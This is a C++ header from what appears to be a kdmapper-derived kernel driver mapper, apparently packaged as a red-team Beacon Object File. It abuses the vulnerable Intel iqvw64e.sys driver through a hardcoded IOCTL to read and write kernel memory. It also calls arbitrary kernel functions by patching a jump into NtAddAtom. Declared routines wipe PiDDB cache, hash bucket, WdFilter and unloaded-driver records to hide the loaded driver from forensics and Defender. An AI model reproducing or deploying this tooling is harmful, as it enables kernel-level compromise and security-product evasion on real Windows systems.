#pragma once
#include <Windows.h>
#include <iostream>
#include <string>
#include <memory>
#include <stdint.h>

#include "intel_driver_resource.hpp"
#include "service.hpp"
#include "utils.hpp"

#define WMAX_PATH (MAX_PATH + 1 * sizeof(wchar_t))

namespace Intel {
	__attribute__((used, section(".data"))) WCHAR driver_name[200] = { }; //NOTE: "iqvw64e.sys" TODO: to be loaded by the BOF
	__attribute__((used, section(".data"))) WCHAR driver_reg_path[] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\";
	__attribute__((used, section(".data"))) WCHAR service_path[] = L"SYSTEM\\CurrentControlSet\\Services";

	__attribute__((used, section(".data"))) UINT_PTR ntoskrnl_addr = 0;
	__attribute__((used, section(".rdata"))) STATIC CONST CHAR alphanum[] = {
		0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6a,0x6b,0x6c,0x6d,0x6e,0x6f,0x70,0x71,0x72,0x73,0x74,0x75,0x76,0x77,0x78,0x79,0x7a,
		0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4a,0x4b,0x4c,0x4d,0x4e,0x4f,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5a
	};
		
	constexpr UINT32 ioctl1 = 0x80862007;
	constexpr DWORD timestamp = 0x5284EAC3;

	typedef struct _COPY_MEMORY_BUFFER_INFO {
		UINT_PTR case_number;
		UINT_PTR reserved;
		UINT_PTR source;
		UINT_PTR destination;
		UINT_PTR length;
	}COPY_MEMORY_BUFFER_INFO, * PCOPY_MEMORY_BUFFER_INFO;


	typedef struct _FILL_MEMORY_BUFFER_INFO {
		UINT_PTR case_number;
		UINT_PTR reserved1;
		UINT32 value;
		UINT32 reserved2;
		UINT_PTR destination;
		UINT_PTR length;
	}FILL_MEMORY_BUFFER_INFO, * PFILL_MEMORY_BUFFER_INFO;


	typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO {
		UINT_PTR case_number;
		UINT_PTR reserved;
		UINT_PTR return_physical_address;
		UINT_PTR address_to_translate;
	}GET_PHYS_ADDRESS_BUFFER_INFO, * PGET_PHYS_ADDRESS_BUFFER_INFO;


	typedef struct _MAP_IO_SPACE_BUFFER_INFO {
		UINT_PTR case_number;
		UINT_PTR reserved;
		UINT_PTR return_value;
		UINT_PTR return_virtual_address;
		UINT_PTR physical_address_to_map;
		UINT32 size;
	}MAP_IO_SPACE_BUFFER_INFO, * PMAP_IO_SPACE_BUFFER_INFO;


	typedef struct _UNMAP_IO_SPACE_BUFFER_INFO {
		UINT_PTR case_number;
		UINT_PTR reserved1;
		UINT_PTR reserved2;
		UINT_PTR virt_address;
		UINT_PTR reserved3;
		UINT32   number_of_bytes;
	}UNMAP_IO_SPACE_BUFFER_INFO, * PUNMAP_IO_SPACE_BUFFER_INFO;

	typedef struct _RTL_BALANCED_LINKS {
		struct _RTL_BALANCED_LINKS* Parent;
		struct _RTL_BALANCED_LINKS* LeftChild;
		struct _RTL_BALANCED_LINKS* RightChild;
		CHAR Balance;
		UCHAR Reserved[3];
	} RTL_BALANCED_LINKS;
	typedef RTL_BALANCED_LINKS* PRTL_BALANCED_LINKS;


	typedef struct _RTL_AVL_TABLE {
		RTL_BALANCED_LINKS BalancedRoot;
		PVOID OrderedPointer;
		ULONG WhichOrderedElement;
		ULONG NumberGenericTableElements;
		ULONG DepthOfTree;
		PVOID RestartKey;
		ULONG DeleteCount;
		PVOID CompareRoutine;
		PVOID AllocateRoutine;
		PVOID FreeRoutine;
		PVOID TableContext;
	} RTL_AVL_TABLE;
	typedef RTL_AVL_TABLE* PRTL_AVL_TABLE;


	typedef struct _PiDDBCacheEntry {
		LIST_ENTRY		List;
		UNICODE_STRING	DriverName;
		ULONG			TimeDateStamp;
		NTSTATUS		LoadStatus;
		char			_0x0028[16]; // data from the shim engine, or uninitialized memory for custom drivers
	} PiDDBCacheEntry, * NPiDDBCacheEntry;


	typedef struct _HashBucketEntry {
		struct _HashBucketEntry* Next;
		UNICODE_STRING DriverName;
		ULONG CertHash[5];
	} HashBucketEntry, * PHashBucketEntry;

	BOOL ClearPiDDBCacheTable(HANDLE handle);
	BOOL ExAcquireResourceExclusiveLite(HANDLE handle, PVOID resource, BOOLEAN wait);
	BOOL ExReleaseResourceLite(HANDLE handle, PVOID resource);
	BOOLEAN RtlDeleteElementGenericTableAvl(HANDLE handle, PVOID table, PVOID buffer);
	PVOID RtlLookupElementGenericTableAvl(HANDLE handle, PRTL_AVL_TABLE table, PVOID buffer);
	PiDDBCacheEntry* LookupEntry(HANDLE handle, PRTL_AVL_TABLE cache_table, ULONG timestamp, CONST WCHAR *name);
	PVOID ResolveRelativeAddress(HANDLE handle, PVOID instruction, ULONG offset, ULONG instruction_size);
	bool AcquireDebugPrivilege();

	UINT_PTR FindPatternAtKernel(HANDLE handle, UINT_PTR address, UINT_PTR size, UINT8 *mask, CONST CHAR *sz_mask);
	UINT_PTR FindSectionAtKernel(HANDLE handle, CONST CHAR *sec_name, UINT_PTR module_ptr, PULONG size);
	UINT_PTR FindPatternInSectionAtKernel(HANDLE handle, CONST CHAR *sec_name, UINT_PTR module_ptr, UINT8 *mask, CONST CHAR *sz_mask);

	BOOL ClearKernelHashBucketList(HANDLE handle);
	BOOL ClearWdFilterDriverList(HANDLE handle);

	BOOL IsRunning();
	HANDLE LoadDriver();
	BOOL Unload(HANDLE handle);

	UINT64 MapIoSpace(HANDLE handle, UINT_PTR physical_address, UINT32 size);
	BOOL UnmapIoSpace(HANDLE handle, UINT_PTR address, UINT32 size);

	BOOL GetPhysicalAddress(HANDLE handle, UINT_PTR address, UINT_PTR* out_physical_address);
	BOOL ReadMemory(HANDLE handle, UINT_PTR address, void* buffer, UINT_PTR size);
	BOOL WriteMemory(HANDLE handle, UINT_PTR address, void* buffer, UINT_PTR size);
	BOOL WriteToReadOnlyMemory(HANDLE handle, UINT_PTR address, void* buffer, UINT32 size);

	/*added by herooyyy*/
	UINT_PTR MmAllocateIndependentPagesEx(HANDLE handle, UINT32 size);
	BOOL MmFreeIndependentPages(HANDLE handle, UINT_PTR address, UINT32 size);
	BOOLEAN MmSetPageProtection(HANDLE handle, UINT_PTR address, UINT32 size, ULONG new_protect);
	
	UINT_PTR AllocatePool(HANDLE handle, nt::POOL_TYPE pool_type, UINT_PTR size);

	bool FreePool(HANDLE handle, UINT_PTR address);
	UINT_PTR GetKernelModuleExport(HANDLE handle, UINT_PTR kernel_module_base, const std::string& function_name);
	bool ClearMmUnloadedDrivers(HANDLE handle);
	std::wstring GetDriverNameW();
	std::wstring GetDriverPath();

	// NOTE: exposed in order to use templates ig. Not sure it's necessary.
	template<typename T, typename ...A>
	bool CallKernelFunction(HANDLE handle, T *out_result, UINT_PTR kernel_function_address, const A ...arguments) {
		constexpr auto call_void = std::is_same_v<T, void>;

		//if count of arguments is >4 fail
		static_assert(sizeof...(A) <= 4);

		if constexpr (!call_void) {
			if (!out_result) {
				return false;
			}
		}
		else {
			UNREFERENCED_PARAMETER(out_result);
		}

		if (!kernel_function_address) {
			return false;
		}

		// Setup function call
		// TODO: add NtAddAtom to API list
		HMODULE ntdll = (HMODULE) FindModuleEntry(NTDLL)->DllBase;
		if (!ntdll) {
			//Log(L"[-] Failed to load ntdll.dll" << std::endl); //never should happens
			return false;
		}

		const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
		if (!NtAddAtom) {
			//Log(L"[-] Failed to get export ntdll.NtAddAtom" << std::endl);
			return false;
		}

		UINT8 kernel_injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		UINT8 original_kernel_function[sizeof(kernel_injected_jmp)];
		*(UINT_PTR*) &kernel_injected_jmp[2] = kernel_function_address;

		// TODO: add ntoskrnl.exe to hash list
		static UINT_PTR kernel_NtAddAtom = GetKernelModuleExport(handle, intel_driver::ntoskrnl_addr, "NtAddAtom");
		if (!kernel_NtAddAtom) {
			//Log(L"[-] Failed to get export ntoskrnl.NtAddAtom" << std::endl);
			return false;
		}

		if (!ReadMemory(handle, kernel_NtAddAtom, &original_kernel_function, sizeof(kernel_injected_jmp)))
			return false;

		if (original_kernel_function[0] == kernel_injected_jmp[0] &&
			original_kernel_function[1] == kernel_injected_jmp[1] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 2] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 2] &&
			original_kernel_function[sizeof(kernel_injected_jmp) - 1] == kernel_injected_jmp[sizeof(kernel_injected_jmp) - 1]) {
			//Log(L"[-] FAILED!: The code was already hooked!! another instance of kdmapper running?!" << std::endl);
			return false;
		}

		// Overwrite the pointer with kernel_function_address
		if (!WriteToReadOnlyMemory(handle, kernel_NtAddAtom, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
			return false;

		// Call function
		if constexpr (!call_void) {
			using FunctionFn = T(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			*out_result = Function(arguments...);
		}
		else {
			using FunctionFn = void(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			Function(arguments...);
		}

		// Restore the pointer/jmp
		return WriteToReadOnlyMemory(handle, kernel_NtAddAtom, original_kernel_function, sizeof(kernel_injected_jmp));
	}
}
